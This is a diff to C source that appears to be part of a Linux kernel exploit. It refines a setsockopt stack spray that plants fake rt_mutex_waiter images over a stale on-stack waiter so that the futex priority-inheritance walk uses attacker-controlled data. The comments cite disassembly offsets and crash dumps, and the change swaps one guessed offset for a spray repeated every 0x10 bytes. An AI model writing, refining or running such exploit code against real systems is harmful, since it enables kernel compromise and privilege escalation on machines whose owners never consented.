@@ -470,25 +470,35 @@ void slide_setsockopt_stack_copy(void) {
    * AF_INET6 SOCK_DGRAM socket (level IPPROTO_IPV6) zeroes a
    * SLIDE_SETSO_SPRAY_COPY_LEN-byte stack buffer at sp+0x40 and copies it
    * from user without any capability check (disasm +0x130).  The stale
-   * on-stack rt_mutex_waiter sits at T-0x4b8 = buffer +
-   * SLIDE_SETSO_SPRAY_WAITER_OFF, so the same words the pselect route would
-   * plant land exactly on it.  The handler then fails validation
-   * (buffer[0x8] != 0xa and buffer[0x88] != 0xa, disasm +0xce8) and returns
-   * -EADDRNOTAVAIL (-99); the planted words persist on the popped stack.  We
-   * only arm the consumer trigger after observing that errno, so a
-   * policy-denied spray (EACCES/EPERM) never lets the PI walk hit garbage.
+   * on-stack rt_mutex_waiter sits at T-0x4b8 (verified from the panic
+   * dumps).  The handler then fails validation (buffer[0x8] != 0xa and
+   * buffer[0x88] != 0xa, disasm +0xce8) and returns -EADDRNOTAVAIL (-99),
+   * leaving the copied words on the popped stack.  We only arm the
+   * consumer trigger after observing that errno, so a policy-denied spray
+   * (EACCES/EPERM) never lets the PI walk hit garbage.
+   *
+   * The exact depth of the copy buffer on the waiter's kernel stack is NOT
+   * pinned by the chain model: the live syscall path on this kernel adds
+   * tracepoint frames (perf_tp_event on the popped stack in the crash
+   * dumps), which is why the single WAITER_OFF guesses (0x40/0x18/0x78)
+   * all left the node with its original futex data and the PI walk read
+   * lock=0.  Instead of trusting one offset, plant the full waiter word
+   * set repeatedly across the whole buffer: one complete image every 0x10
+   * covers [0, SLIDE_SETSO_SPRAY_COPY_LEN) contiguously, so any node
+   * position inside the buffer lands in a complete rt_mutex_waiter image.
    */
   slide_build_waiter_words();
   unsigned char buf[SLIDE_SETSO_SPRAY_COPY_LEN];
   memset(buf, 0, sizeof(buf));
-  for (int i = 0; i < slide_waiter_word_count; i++) {
-    size_t off = SLIDE_SETSO_SPRAY_WAITER_OFF + (size_t)i * 8;
-    if (off + 8 > sizeof(buf)) {
-      pr_warning("slide setsockopt waiter word %d exceeds buffer off=%zu\n",
-                 i, off);
-      break;
+  size_t waiter_layout = (size_t)slide_waiter_word_count * 8;
+  for (size_t base = 0; base + waiter_layout <= sizeof(buf); base += 0x10) {
+    for (int i = 0; i < slide_waiter_word_count; i++) {
+      size_t off = base + (size_t)i * 8;
+      if (off + 8 > sizeof(buf)) {
+        break;
+      }
+      memcpy(buf + off, &slide_waiter_words[i].value, 8);
     }
-    memcpy(buf + off, &slide_waiter_words[i].value, 8);
   }
 
   int fd = (int)syscall(SYS_socket, SLIDE_SETSO_SPRAY_FAMILY, SOCK_DGRAM, 0);
